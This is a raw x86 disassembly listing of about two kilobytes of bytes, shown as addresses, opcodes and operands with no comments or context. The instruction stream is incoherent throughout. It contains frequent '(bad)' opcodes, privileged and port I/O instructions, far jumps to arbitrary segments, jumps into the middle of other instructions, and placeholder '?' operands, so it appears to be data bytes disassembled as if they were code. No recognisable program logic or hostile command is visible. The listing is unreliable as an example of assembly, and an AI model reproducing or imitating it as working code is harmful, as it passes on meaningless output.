  4120c6:	test   DWORD PTR [ecx+0x720d5f48],eax
  4120cc:	push   eax
  4120cd:	jmp    0x1d96:0xe5efe27
  4120d4:	cdq    
  4120d5:	sub    esp,DWORD PTR [edx-0xc]
  4120d8:	retf   0xbe11
  4120db:	jae    0x412128
  4120dd:	push   ds
  4120de:	mov    ebx,0x5ec921f
  4120e3:	push   eax
  4120e4:	das    
  4120e5:	sti    
  4120e6:	or     esi,DWORD PTR [edi+ebp*2]
  4120e9:	xlat   BYTE PTR ds:[ebx]
  4120ea:	mov    ebx,0x66fbb765
  4120ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f0:	push   esp
  4120f1:	loope  0x4120a2
  4120f3:	int    0x34
  4120f5:	sbb    al,0x1a
  4120f7:	xor    BYTE PTR [ecx-0x6d],0xea
  4120fb:	mov    edx,DWORD PTR [ebx+ebp*8]
  4120fe:	push   es
  4120ff:	pusha  
  412100:	retf   0x1963
  412103:	imul   ecx,edi,0xffffffc9
  412106:	push   0xffffffac
  412108:	mov    edx,0xb205d24d
  41210d:	ret    
  41210e:	popa   
  41210f:	lods   al,BYTE PTR ds:[esi]
  412110:	or     eax,0xa5552e58
  412115:	fdivr  DWORD PTR [eax]
  412117:	jg     0x4120cd
  412119:	daa    
  41211a:	jg     0x4120d7
  41211c:	ret    
  41211d:	sbb    BYTE PTR [ebp+0x150c6a4b],0xac
  412124:	inc    esp
  412125:	pop    ebp
  412126:	and    BYTE PTR [edi-0x5f],ah
  412129:	xor    al,0x84
  41212b:	mov    BYTE PTR [edi-0x3752ff12],bh
  412131:	sbb    al,0x2c
  412133:	jmp    0x5e2095d
  412138:	add    ecx,DWORD PTR [ebp+0x2f]
  41213b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41213c:	cs xchg edx,eax
  41213e:	outs   dx,DWORD PTR ds:[esi]
  41213f:	clc    
  412140:	test   al,0x18
  412142:	shr    BYTE PTR [ebx+0x60],0x25
  412146:	mov    cl,0x22
  412148:	aam    0xbe
  41214a:	bound  edx,QWORD PTR [eax-0x60]
  41214d:	mov    ecx,0x999b3c54
  412152:	rol    dh,1
  412154:	or     ebx,DWORD PTR [esi-0x8]
  412157:	or     al,0x4e
  412159:	mov    bl,0xd
  41215b:	das    
  41215c:	es mov edx,0xf04b6274
  412162:	test   eax,0xd58a8222
  412167:	mov    dl,0x84
  412169:	(bad)  
  41216a:	and    al,0x82
  41216c:	fst    QWORD PTR [edx+edi*2+0x353d5ac0]
  412173:	push   cs
  412174:	or     eax,0x47c51899
  412179:	pop    ebp
  41217a:	mul    BYTE PTR [ecx-0xc3d548]
  412180:	sbb    ebp,DWORD PTR [esi-0x64364041]
  412186:	jmp    0xb77d1ff1
  41218b:	push   ebp
  41218c:	aad    0xd5
  41218e:	pop    ebp
  41218f:	enter  0x2c63,0x33
  412193:	mov    dh,0x74
  412195:	or     DWORD PTR [eax],edx
  412197:	adc    al,0x8e
  412199:	(bad)  
  41219a:	hlt    
  41219b:	push   0x9fb410e
  4121a0:	or     BYTE PTR [edx+0x204d95ea],0xea
  4121a7:	outs   dx,DWORD PTR ds:[esi]
  4121a8:	sar    edx,1
  4121aa:	test   DWORD PTR [ebp-0x36be2c45],edx
  4121b0:	inc    ebx
  4121b1:	mov    eax,0xde8629dc
  4121b6:	and    esi,edx
  4121b8:	sub    esp,eax
  4121ba:	or     al,0xdf
  4121bc:	push   0x553e02e0
  4121c1:	into   
  4121c2:	mov    esi,0xb5a900db
  4121c7:	cdq    
  4121c8:	daa    
  4121c9:	sbb    al,0xdf
  4121cb:	sub    eax,0x8b8b886f
  4121d0:	mov    dh,0x4f
  4121d2:	neg    edi
  4121d4:	imul   esi,DWORD PTR [ecx+0x5aa9d7a3],0x49dd7df5
  4121de:	ins    DWORD PTR es:[edi],dx
  4121df:	repnz fidiv DWORD PTR [ebx+edx*8]
  4121e3:	(bad)  
  4121e4:	jp     0x41222c
  4121e6:	stos   BYTE PTR es:[edi],al
  4121e7:	gs enter 0xcc49,0x72
  4121ec:	pop    es
  4121ed:	pop    ebp
  4121ee:	jge    0x4121b5
  4121f0:	(bad)  
  4121f1:	adc    bl,ch
  4121f3:	in     eax,0x47
  4121f5:	test   eax,0x23c934d0
  4121fa:	fs inc esp
  4121fc:	ret    0xdabf
  4121ff:	mov    eax,0xb620c151
  412204:	imul   ecx,DWORD PTR [eax+0x34],0xffffffbc
  412208:	sahf   
  412209:	sub    esi,DWORD PTR [edx-0x1bc72e68]
  41220f:	adc    dh,BYTE PTR [edx+0x79938eb6]
  412215:	sti    
  412216:	add    ebx,ebp
  412218:	jl     0x4121f8
  41221a:	fistp  QWORD PTR [ebp+0x35]
  41221d:	or     esp,DWORD PTR [eax+0x73]
  412220:	cdq    
  412221:	div    DWORD PTR [ebx]
  412223:	or     DWORD PTR [edi+0x79],0xe73302f5
  41222a:	scas   al,BYTE PTR es:[edi]
  41222b:	pop    ecx
  41222c:	push   ss
  41222d:	push   ds
  41222e:	jbe    0x412287
  412230:	sti    
  412231:	push   es
  412232:	mov    edi,?
  412234:	xchg   DWORD PTR [edx+0x11],edi
  412237:	cs stc 
  412239:	xor    eax,0xa17cee5
  41223e:	xor    DWORD PTR [ebp+0x1f],0x5f
  412242:	loope  0x4121e7
  412244:	jle    0x4121f5
  412246:	dec    eax
  412247:	cmp    al,BYTE PTR [esi-0x45]
  41224a:	mov    edi,0xc6a4a268
  41224f:	xor    al,0x36
  412251:	jmp    0x17e8cf40
  412256:	push   eax
  412257:	rcl    BYTE PTR [ebx+ebp*4+0x5f],cl
  41225b:	or     DWORD PTR [ecx-0x6476e67a],edx
  412261:	adc    cl,bl
  412263:	cli    
  412264:	mov    edi,esp
  412266:	ret    
  412267:	adc    ecx,DWORD PTR [ebp-0x5c98e115]
  41226d:	das    
  41226e:	int    0x4a
  412270:	and    ebx,edi
  412272:	les    ecx,FWORD PTR [edx]
  412274:	jle    0x4122a5
  412276:	mov    eax,ds:0x2260a01b
  41227b:	aaa    
  41227c:	arpl   WORD PTR [esi+0x5bcadccd],sp
  412282:	add    DWORD PTR [edi],ecx
  412284:	adc    BYTE PTR [eax],ch
  412286:	mov    dh,0xc8
  412288:	and    al,0x3f
  41228a:	test   BYTE PTR [edi],0xd7
  41228d:	nop
  41228e:	fisttp WORD PTR [edx]
  412290:	jg     0x41228e
  412292:	jns    0x41222a
  412294:	into   
  412295:	dec    edi
  412296:	mov    ebx,0x7b21cfb7
  41229b:	xor    ebx,ecx
  41229d:	add    al,BYTE PTR [ebx]
  41229f:	sbb    BYTE PTR [eax+0x64],cl
  4122a2:	inc    ebx
  4122a3:	imul   BYTE PTR [eax-0x23]
  4122a6:	sbb    al,0x65
  4122a8:	bound  eax,QWORD PTR [ebx+0x4f8af363]
  4122ae:	jmp    0x207b1afa
  4122b3:	(bad)  
  4122b5:	pop    ecx
  4122b6:	cli    
  4122b7:	or     BYTE PTR [ecx+ebp*4],bl
  4122ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122bc:	loop   0x4122bf
  4122be:	jae    0x412314
  4122c0:	inc    eax
  4122c1:	(bad)  
  4122c2:	stos   DWORD PTR es:[edi],eax
  4122c3:	repz pop edi
  4122c5:	dec    ebp
  4122c6:	shr    BYTE PTR [edx-0x21],0x9a
  4122ca:	push   eax
  4122cb:	(bad)  
  4122cc:	push   es
  4122cd:	and    BYTE PTR [edx+0x33548d47],dl
  4122d3:	popf   
  4122d4:	xchg   ecx,eax
  4122d5:	fstp   QWORD PTR [esp+0x64]
  4122d9:	mov    es:0xe3c138e7,eax
  4122df:	addr16 repnz out dx,eax
  4122e2:	pop    eax
  4122e3:	jge    0x412336
  4122e5:	dec    ebp
  4122e6:	dec    ebx
  4122e7:	std    
  4122e8:	call   0xa50a:0x2eaff540
  4122ef:	lods   al,BYTE PTR ds:[esi]
  4122f0:	cmp    ebp,DWORD PTR [edi+0x376dd71a]
  4122f6:	xor    eax,0x1ed9c052
  4122fb:	pusha  
  4122fc:	ja     0x4122c6
  4122fe:	lock push esp
  412300:	imul   edi,DWORD PTR [ebx-0x119ae31a],0xd50338f6
  41230a:	dec    eax
  41230b:	test   BYTE PTR [ebp+0x56705d72],cl
  412311:	lock and DWORD PTR [eax+0x7a889b89],eax
  412318:	in     eax,0x34
  41231a:	es mov ah,dl
  41231d:	push   eax
  41231e:	mov    esp,0xd6793b64
  412323:	mov    eax,0x653f2812
  412328:	ret    0x3ab9
  41232b:	mov    esi,0xbe1edfa6
  412330:	jns    0x4122f5
  412332:	sbb    bl,0x4a
  412335:	ja     0x41231e
  412337:	stc    
  412338:	sub    DWORD PTR [ecx+0x72],ecx
  41233b:	jo     0x4122be
  41233d:	data16 cmc 
  41233f:	(bad)  
  412340:	xchg   esp,eax
  412341:	ror    ebp,cl
  412343:	sbb    al,0xcf
  412345:	(bad)  
  412346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412347:	mov    ebp,0xab44a08f
  41234c:	or     eax,0x3e130ab7
  412351:	xor    DWORD PTR [ebx],esp
  412353:	mov    ebp,cs
  412355:	sbb    BYTE PTR [edi-0x30],al
  412358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412359:	cmp    al,0xab
  41235b:	clc    
  41235c:	jge    0x412359
  41235e:	or     ebx,esp
  412360:	popa   
  412361:	push   eax
  412362:	mov    esp,0x99c012c1
  412367:	jb     0x412317
  412369:	fstp   QWORD PTR [edi]
  41236b:	ffree  st(7)
  41236d:	xor    DWORD PTR [edx-0x5a47a17f],ecx
  412373:	push   esp
  412374:	bound  ebx,QWORD PTR [edx+0xa]
  412377:	in     al,0x67
  412379:	inc    ebp
  41237a:	inc    ebx
  41237b:	sar    DWORD PTR [edx-0x24],0x78
  41237f:	xchg   edi,eax
  412380:	push   ecx
  412381:	jmp    0x1a2a4754
  412386:	add    ebx,DWORD PTR [esp+ebx*1]
  412389:	cmp    ah,BYTE PTR [esi-0x5f]
  41238c:	repz retf 
  41238e:	mov    cl,0x9a
  412390:	xlat   BYTE PTR ds:[ebx]
  412391:	inc    esi
  412392:	retf   0xfa92
  412395:	ss inc esp
  412397:	xchg   ebp,eax
  412398:	retf   0xd51d
  41239b:	inc    esp
  41239c:	sbb    BYTE PTR [edi-0x12],dl
  41239f:	mov    bl,bl
  4123a1:	sub    BYTE PTR [edi+0x58],ah
  4123a4:	inc    esp
  4123a5:	test   al,0xc7
  4123a7:	sub    esi,DWORD PTR [ebx]
  4123a9:	dec    edx
  4123aa:	xor    BYTE PTR [esi+0x72453526],cl
  4123b0:	call   0xa9bf:0xfd0794ed
  4123b7:	cmp    al,0x39
  4123b9:	pop    ebp
  4123ba:	push   ss
  4123bb:	and    DWORD PTR [ecx+0x46],0xd64d84d5
  4123c2:	cld    
  4123c3:	mov    dh,0x31
  4123c5:	xor    edx,DWORD PTR [ebx-0x21]
  4123c8:	add    al,0x22
  4123ca:	clc    
  4123cb:	fs aad 0x96
  4123ce:	clc    
  4123cf:	pop    esi
  4123d0:	mov    ebx,0x8f7a7c06
  4123d5:	and    DWORD PTR [edx],ebx
  4123d7:	xchg   ebx,eax
  4123d8:	pop    eax
  4123d9:	mov    dh,BYTE PTR [esi]
  4123db:	add    bh,BYTE PTR [ebp-0x62aa779b]
  4123e1:	div    bl
  4123e3:	imul   ecx,esi,0xbe156c6
  4123e9:	push   cs
  4123ea:	scas   eax,DWORD PTR es:[edi]
  4123eb:	or     eax,0x794915f3
  4123f0:	xchg   ecx,eax
  4123f1:	pop    ss
  4123f2:	adc    DWORD PTR [ecx+edi*8+0x34],eax
  4123f6:	shr    esi,1
  4123f8:	add    bl,BYTE PTR [ebp-0x5df07f09]
  4123fe:	loop   0x4123be
  412400:	jns    0x412462
  412402:	jo     0x41238c
  412404:	and    al,0xfb
  412406:	xchg   DWORD PTR [ebp-0x136dd7b8],edx
  41240c:	sbb    DWORD PTR [ebx+0x472a0b09],ecx
  412412:	lods   eax,DWORD PTR ds:[esi]
  412413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412414:	jns    0x412454
  412416:	fs dec edx
  412418:	stc    
  412419:	add    BYTE PTR [edx-0x58a8d7dc],cl
  41241f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412420:	(bad)  
  412421:	jno    0x412491
  412423:	rol    DWORD PTR cs:[ecx+edi*8+0x7ce2b8f5],cl
  41242b:	inc    esi
  41242c:	in     eax,0x96
  41242e:	test   BYTE PTR [edi-0x65],ch
  412431:	scas   eax,DWORD PTR es:[edi]
  412432:	mov    ebp,0x63ac53ce
  412437:	jno    0x412484
  412439:	clc    
  41243a:	ja     0x412491
  41243c:	mov    ds:0xbd21aa1b,eax
  412441:	ins    BYTE PTR es:[edi],dx
  412442:	iret   
  412443:	and    eax,0xc804a5cc
  412448:	sbb    ch,BYTE PTR [eax+0x47]
  41244b:	repnz das 
  41244d:	xor    eax,0x7d429495
  412452:	mov    bh,0xe2
  412454:	push   ds
  412455:	pop    eax
  412456:	dec    eax
  412457:	bnd ja 0x412494
  41245a:	jo     0x41248e
  41245c:	pushf  
  41245d:	sub    al,0xcc
  41245f:	dec    ebp
  412460:	dec    esp
  412461:	xchg   edi,eax
  412462:	push   ebx
  412463:	cdq    
  412464:	lea    di,[edi-0x3702982]
  41246b:	mov    ds:0x7ac6acd3,eax
  412470:	mov    eax,0x54a01ec3
  412475:	sbb    ah,BYTE PTR [esi]
  412477:	(bad)  
  412478:	loopne 0x412491
  41247a:	repz test BYTE PTR [edx],0x31
  41247e:	out    dx,eax
  41247f:	aad    0x0
  412481:	sub    DWORD PTR [eax-0x7b875af],edx
  412487:	xor    al,0x80
  412489:	push   ebp
  41248a:	dec    esi
  41248b:	push   esp
  41248c:	sub    BYTE PTR [ebp+esi*8+0x5fd546f8],0x3
  412494:	(bad)  
  412495:	enter  0xc5f8,0xec
  412499:	push   0xb01c66be
  41249e:	jge    0x41250c
  4124a0:	sbb    esp,DWORD PTR ds:[esi]
  4124a3:	jo     0x412436
  4124a5:	xor    eax,0x6a0bc0fd
  4124aa:	nop
  4124ab:	cmc    
  4124ac:	nop
  4124ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ae:	retf   
  4124af:	and    al,0x59
  4124b1:	(bad)
  4124b4:	popa   
  4124b5:	pop    esp
  4124b6:	addr16 inc ecx
  4124b8:	mov    di,WORD PTR [esi-0x20e0807]
  4124bf:	dec    esi
  4124c0:	inc    ecx
  4124c1:	and    eax,DWORD PTR [esi]
  4124c3:	xchg   ebx,eax
  4124c4:	jge    0x4124cb
  4124c6:	loope  0x412485
  4124c8:	(bad)  
  4124c9:	into   
  4124ca:	inc    esi
  4124cb:	int3   
  4124cc:	iret   
  4124cd:	adc    esp,ecx
  4124cf:	jge    0x412476
  4124d1:	push   ebp
  4124d2:	out    0xfb,eax
  4124d4:	mov    BYTE PTR [ecx+0x48],0x5c
  4124d8:	dec    ebx
  4124d9:	xchg   esp,eax
  4124da:	and    DWORD PTR ds:0xb4339c37,esp
  4124e0:	leave  
  4124e1:	ja     0x4124d5
  4124e3:	sbb    ah,BYTE PTR [edi+0x11cd6ff7]
  4124e9:	addr16 jo 0x4124ea
  4124ec:	addr16 nop
  4124ee:	push   edi
  4124ef:	iret   
  4124f0:	ds and eax,edx
  4124f3:	sub    al,BYTE PTR [ebx]
  4124f5:	mov    DWORD PTR gs:[esp+ebx*8+0x6a],ebx
  4124fa:	xchg   ecx,eax
  4124fb:	icebp  
  4124fc:	in     al,0xa8
  4124fe:	or     BYTE PTR [esi],al
  412500:	sbb    al,0x62
  412502:	je     0x412517
  412504:	sub    al,0x72
  412506:	popf   
  412507:	sbb    DWORD PTR [esi],ebp
  412509:	inc    edx
  41250a:	aam    0xfb
  41250c:	xchg   ebp,eax
  41250d:	pop    ss
  41250e:	sub    BYTE PTR [ecx],0xdc
  412511:	ja     0x4124d8
  412513:	mov    ah,0xc3
  412515:	sub    DWORD PTR [edi-0x50],edx
  412518:	and    al,0x1d
  41251a:	dec    ebp
  41251b:	sub    ah,BYTE PTR ds:[edi+edi*8]
  41251f:	and    edx,DWORD PTR [esi+0x8019b95]
  412525:	test   BYTE PTR [eax],bl
  412527:	sbb    al,0xe5
  412529:	inc    ecx
  41252a:	mov    ebp,DWORD PTR [edx+ecx*8]
  41252d:	dec    esi
  41252e:	pop    ebx
  41252f:	sbb    ah,BYTE PTR [ebp-0x5c]
  412532:	pop    esp
  412533:	sub    ch,BYTE PTR [esi+0x17720771]
  412539:	out    0x48,eax
  41253b:	inc    BYTE PTR [edx+0x7b145f15]
  412541:	push   edi
  412542:	js     0x412512
  412544:	repz sub al,0x94
  412547:	pop    esi
  412548:	sbb    BYTE PTR [esi+esi*1],0xb8
  41254c:	pop    eax
  41254d:	jae    0x412572
  41254f:	rcr    BYTE PTR [eax],0x20
  412552:	fsub   st(6),st
  412554:	aad    0x43
  412556:	push   ecx
  412557:	mov    ah,0xda
  412559:	in     al,0xc5
  41255b:	push   esi
  41255c:	adc    BYTE PTR [ecx-0x1fd98b49],bh
  412562:	in     al,0xa8
  412564:	ret    0x12cf
  412567:	add    eax,ebx
  412569:	adc    BYTE PTR [edx],0x45
  41256c:	jecxz  0x412570
  41256e:	in     al,0xdd
  412570:	or     BYTE PTR [edx],dh
  412572:	popa   
  412573:	dec    ebx
  412574:	ja     0x41253e
  412576:	push   DWORD PTR [edx-0x163e090d]
  41257c:	jb     0x4125df
  41257e:	(bad)  
  412580:	push   edx
  412581:	fiadd  DWORD PTR [edx]
  412583:	gs pop ebx
  412585:	push   es
  412586:	push   0x5ca8be2c
  41258b:	adc    BYTE PTR [esi+esi*4],cl
  41258e:	and    al,0x20
  412590:	and    al,0x49
  412592:	not    bh
  412594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412595:	retf   0x32fd
  412598:	mov    bh,0x48
  41259a:	repnz mov ebp,0x5365b1ad
  4125a0:	sub    al,0xc9
  4125a2:	add    DWORD PTR [ecx+0x2796653d],0xc51b8445
  4125ac:	scas   al,BYTE PTR es:[edi]
  4125ad:	dec    edi
  4125ae:	lods   eax,DWORD PTR ds:[esi]
  4125af:	idiv   BYTE PTR [edi]
  4125b1:	jl     0x4125e4
  4125b3:	push   ds
  4125b4:	inc    esp
  4125b5:	sbb    BYTE PTR [edx+edx*2+0x58],dh
  4125b9:	pop    esi
  4125ba:	dec    edi
  4125bb:	out    dx,al
  4125bc:	std    
  4125bd:	or     DWORD PTR [ecx],ebp
  4125bf:	cmp    ah,BYTE PTR [ebp+0x528ebe21]
  4125c5:	xor    DWORD PTR [esi],ebx
  4125c7:	pop    ss
  4125c8:	sahf   
  4125c9:	icebp  
  4125ca:	aaa    
  4125cb:	add    dh,BYTE PTR [edi]
  4125cd:	push   esp
  4125ce:	(bad)  
  4125cf:	and    esi,edx
  4125d1:	inc    esi
  4125d2:	repnz and BYTE PTR [edi],dh
  4125d5:	adc    cl,bl
  4125d7:	xchg   esp,eax
  4125d8:	xor    al,0xe3
  4125da:	gs jnp 0x4125b4
  4125dd:	mov    bl,0x8
  4125df:	xchg   esi,eax
  4125e0:	jg     0x4125d4
  4125e2:	(bad)  
  4125e4:	leave  
  4125e5:	bound  esi,QWORD PTR [ebp-0x447eef36]
  4125eb:	fcom   QWORD PTR [edx+edx*2]
  4125ee:	fisub  WORD PTR [ecx-0x35]
  4125f1:	cmp    al,0xad
  4125f3:	xchg   ecx,eax
  4125f4:	in     al,dx
  4125f5:	inc    edi
  4125f6:	mov    eax,ds:0xe25a1df8
  4125fb:	jnp    0x412625
  4125fd:	clc    
  4125fe:	bound  eax,QWORD PTR [edx-0x5d]
  412601:	ror    ebx,0x2d
  412604:	jns    0x41267f
  412606:	pop    esp
  412607:	xor    bh,ah
  412609:	call   0x3c1c:0x7af54179
  412610:	ss pop esi
  412612:	fmul   QWORD PTR [edx]
  412614:	and    BYTE PTR [eax],bh
  412616:	inc    ebx
  412617:	mov    eax,0x2df89843
  41261c:	push   0xffffffd4
  41261e:	jo     0x4125fe
  412620:	mov    al,dl
  412622:	int    0xb
  412624:	jl     0x4125dd
  412626:	adc    BYTE PTR [eax],0xdb
  412629:	push   0xc9708fd5
  41262e:	xchg   esp,eax
  41262f:	xchg   DWORD PTR [ecx],esi
  412631:	xchg   DWORD PTR [ebx],ebp
  412633:	shl    DWORD PTR [eax-0x57dc116a],1
  412639:	mov    WORD PTR [edx-0x6696c7f7],?
  41263f:	adc    ebx,edx
  412641:	push   edi
  412642:	add    al,BYTE PTR ds:0x86fdb1ec
  412648:	icebp  
  412649:	xlat   BYTE PTR ds:[ebx]
  41264a:	cmp    BYTE PTR [eax+0x48cb43ca],cl
  412650:	stos   DWORD PTR es:[edi],eax
  412651:	dec    edx
  412652:	sbb    edx,DWORD PTR [edx*2+0x49456767]
  412659:	pop    eax
  41265a:	jno    0x412649
  41265c:	or     dl,cl
  41265e:	fnstsw WORD PTR ds:0x30efb9e4
  412664:	clc    
  412665:	aad    0x88
  412667:	mov    edi,0xaf8925c4
  41266c:	pusha  
  41266d:	or     al,0x76
  41266f:	sahf   
  412670:	jecxz  0x4126b3
  412672:	push   0xffffff9a
  412674:	pop    ebx
  412675:	jge    0x41265c
  412677:	xchg   BYTE PTR [esi+0x5135eaec],ah
  41267d:	push   ss
  41267e:	inc    edx
  41267f:	push   edi
  412680:	shl    BYTE PTR [edi-0x18],1
  412683:	js     0x412638
  412685:	push   esp
  412686:	add    eax,0x1d77ab58
  41268b:	lahf   
  41268c:	in     al,0xeb
  41268e:	shl    ebp,cl
  412690:	adc    edx,0x15
  412693:	dec    edi
  412694:	(bad)  
  412695:	xchg   edx,eax
  412696:	xchg   edx,eax
  412697:	sbb    BYTE PTR [eax],ah
  412699:	addr16 pop esi
  41269b:	inc    edi
  41269c:	sahf   
  41269d:	dec    edi
  41269e:	push   0x51
  4126a0:	xchg   ecx,eax
  4126a1:	into   
  4126a2:	shl    ecx,0x36
  4126a5:	mov    edi,0xff0aa778
  4126aa:	adc    cl,bh
  4126ac:	and    eax,0x78d9c59f
  4126b1:	mov    esp,0x328aed5
  4126b6:	jmp    0x82be2ae4
  4126bb:	inc    esi
  4126bc:	adc    DWORD PTR [edx],ecx
  4126be:	test   eax,0x3d1f3198
  4126c3:	or     eax,DWORD PTR [eax]
  4126c5:	ins    BYTE PTR es:[edi],dx
  4126c6:	fwait
  4126c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c8:	cmp    ebx,DWORD PTR [ebx+eax*4+0x2f7db43b]
  4126cf:	lods   al,BYTE PTR ds:[esi]
  4126d0:	loop   0x412673
  4126d2:	push   ds
  4126d3:	jnp    0x4126af
  4126d5:	add    al,0x7a
  4126d7:	sub    DWORD PTR [edx-0x40],eax
  4126da:	in     eax,0x97
  4126dc:	and    ebx,DWORD PTR [esi+0x53]
  4126df:	jno    0x4126fa
  4126e1:	jne    0x4126bc
  4126e3:	outs   dx,BYTE PTR ds:[esi]
  4126e4:	pop    ss
  4126e5:	push   cs
  4126e6:	clc    
  4126e7:	sbb    al,0xf2
  4126e9:	ins    DWORD PTR es:[edi],dx
  4126ea:	in     eax,0x5c
  4126ec:	dec    eax
  4126ed:	and    DWORD PTR [edx+0x48],edi
  4126f0:	sub    ah,BYTE PTR [ebx+0x40]
  4126f3:	jg     0x412742
  4126f5:	ds retf 
  4126f7:	pushf  
  4126f8:	stos   DWORD PTR es:[edi],eax
  4126f9:	inc    esi
  4126fa:	mov    fs,ecx
  4126fc:	loope  0x41274d
  4126fe:	push   ss
  4126ff:	pop    DWORD PTR ds:0x43bcd3bf
  412705:	test   BYTE PTR [ecx-0x6c122cb3],0x4b
  41270c:	addr16 add ebp,eax
  41270f:	mov    ecx,0x12d65a17
  412714:	inc    esi
  412715:	mov    al,0xb3
  412717:	arpl   WORD PTR [esi+0x33],bx
  41271a:	inc    esi
  41271b:	cmp    BYTE PTR [eax],ah
  41271d:	pusha  
  41271e:	sti    
  41271f:	dec    edi
  412720:	ds xchg esp,eax
  412722:	out    dx,al
  412723:	pop    edx
  412724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412725:	aam    0xa8
  412727:	out    dx,eax
  412728:	(bad)  
  412729:	jp     0x4126f5
  41272b:	add    BYTE PTR [esi+0x18d7d6f7],0x29
  412732:	sahf   
  412733:	push   esp
  412734:	iret   
  412735:	pop    ds
  412736:	fdivr  QWORD PTR [eax-0x5d021262]
  41273c:	sti    
  41273d:	jl     0x4127a2
  41273f:	inc    ebx
  412740:	sbb    ch,BYTE PTR ds:0xa1dc8973
  412746:	(bad)  
  412747:	in     al,dx
  412748:	mov    edi,DWORD PTR [esi-0x7efb71a]
  41274e:	add    eax,0xd56070b8
  412753:	xor    al,0x24
  412755:	jmp    0x412733
  412757:	xchg   ecx,eax
  412758:	(bad)  
  41275a:	mov    BYTE PTR [ecx-0xa109837],dh
  412760:	(bad)  
  412761:	xor    BYTE PTR [esp+ecx*2],ah
  412764:	cmp    DWORD PTR [ebx+ebp*2-0x57dd719b],esp
  41276b:	dec    esi
  41276c:	push   0xd8836825
  412771:	fnstcw WORD PTR [edx+0x79]
  412774:	jno    0x412743
  412776:	sub    eax,0xcfc5f182
  41277b:	push   cs
  41277c:	sub    esi,ebp
  41277e:	mov    bl,0xbf
  412780:	jmp    0x412747
  412782:	in     al,dx
  412783:	clc    
  412784:	in     al,0x67
  412786:	and    DWORD PTR [edx],ebx
  412788:	xchg   BYTE PTR [edx],al
  41278a:	ror    ebp,0x46
  41278d:	adc    eax,0x8a307c3a
  412792:	jo     0xdc4dab28
  412798:	leave  
  412799:	add    eax,0x6b0e67e0
  41279e:	mov    eax,ds:0x5f25ecd0
  4127a3:	leave  
  4127a4:	dec    esp
  4127a5:	sbb    eax,DWORD PTR [eax+0x75a5ff24]
  4127ab:	ins    DWORD PTR es:[edi],dx
  4127ac:	aaa    
  4127ad:	(bad)  
  4127af:	(bad)  
  4127b0:	cwde   
  4127b1:	push   edx
  4127b2:	(bad)  
  4127b3:	cld    
  4127b4:	hlt    
  4127b5:	mov    ds:0x8382699e,al
  4127ba:	gs sub al,0xd1
  4127bd:	add    ah,BYTE PTR [ebp+0x46]
  4127c0:	jp     0x412802
  4127c2:	jnp    0x412829
  4127c4:	jle    0x4127ec
  4127c6:	pop    ss
  4127c7:	or     al,0xb
  4127c9:	or     cl,bh
  4127cb:	pop    ds
  4127cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127ce:	or     DWORD PTR [edi+0x231b6339],ecx
  4127d4:	xchg   esi,eax
  4127d5:	pushf  
  4127d6:	xchg   ecx,eax
  4127d7:	aam    0x1a
  4127d9:	dec    edi
  4127da:	mov    bh,0xe0
  4127dc:	sub    al,0x49
  4127de:	and    al,cl
  4127e0:	sub    BYTE PTR [edi+0x73],dl
  4127e3:	mov    ds:0xf3006b89,al
  4127e8:	mov    al,BYTE PTR [edi+edi*4]
  4127eb:	clc    
  4127ec:	xchg   edx,eax
  4127ed:	push   ecx
  4127ee:	enter  0x7545,0xdc
  4127f2:	cmp    eax,esi
  4127f4:	stos   BYTE PTR es:[edi],al
  4127f5:	and    esp,edi
  4127f7:	sbb    esp,DWORD PTR ds:0x15a9f64f
  4127fd:	xor    ch,BYTE PTR [esi-0x13df1a]
  412803:	jne    0x41285e
  412805:	cmp    DWORD PTR [edx+edx*4],eax
  412808:	jmp    0x9356:0x1b7fa474
  41280f:	and    al,0xf3
  412811:	stos   BYTE PTR es:[edi],al
  412812:	call   0x744ec38c
  412817:	adc    al,0x9a
  412819:	adc    DWORD PTR [esi],ecx
  41281b:	pop    esi
  41281c:	adc    BYTE PTR [edx-0x1d],bl
  41281f:	sbb    eax,0x11312dbd
  412824:	push   ss
  412825:	dec    edx
  412826:	out    0x5d,eax
  412828:	adc    bl,cl
  41282a:	push   ebx
  41282b:	stc    
  41282c:	pop    ebp
  41282d:	or     DWORD PTR [ebx+0x18efa518],ebx
  412833:	fstp   st(4)
  412835:	push   ss
  412836:	ja     0x412821
  412838:	(bad)
  41283c:	xor    cl,BYTE PTR [edi]
  41283e:	out    0x54,eax
  412840:	mov    DWORD PTR [esi-0x2e363972],ebp
  412846:	lds    edx,FWORD PTR [edx]
  412848:	or     eax,0x2169b202
  41284d:	sbb    DWORD PTR [edi+0x58],ecx
  412850:	mov    edi,0xb3566d91
  412855:	mov    ecx,0x92d3b1cc
  41285a:	mov    eax,ds:0xa5c8ec33
  41285f:	dec    ecx
  412860:	xchg   ecx,eax
  412861:	jle    0x41283b
  412863:	inc    esi
  412864:	dec    edx
  412865:	in     eax,dx
  412866:	idiv   bh
  412868:	cwde   
  412869:	ret    
  41286a:	add    BYTE PTR [edi],ah
  41286c:	iret   
  41286d:	xchg   ebp,eax
  41286e:	cmp    esp,DWORD PTR [esi+0x55ba5a3]
  412874:	adc    dl,dh
  412876:	lds    edx,FWORD PTR [eax]
  412878:	mov    bl,BYTE PTR [esi+edi*2-0x36]
  41287c:	and    BYTE PTR [ecx+0x23],ah
  41287f:	and    ah,BYTE PTR [edx+ebp*4+0x42]
  412883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412884:	icebp  
  412885:	hlt    
  412886:	ins    DWORD PTR es:[edi],dx
  412887:	test   DWORD PTR [edi],ecx
  412889:	inc    edx
  41288a:	sbb    ch,BYTE PTR [edi+0x40]
  41288d:	dec    esi
  41288e:	or     DWORD PTR [ebx],0x733bea30
  412894:	out    0x10,eax
  412896:	repz add al,0x5e
  412899:	(bad)  
  41289a:	test   eax,0x76f1379e
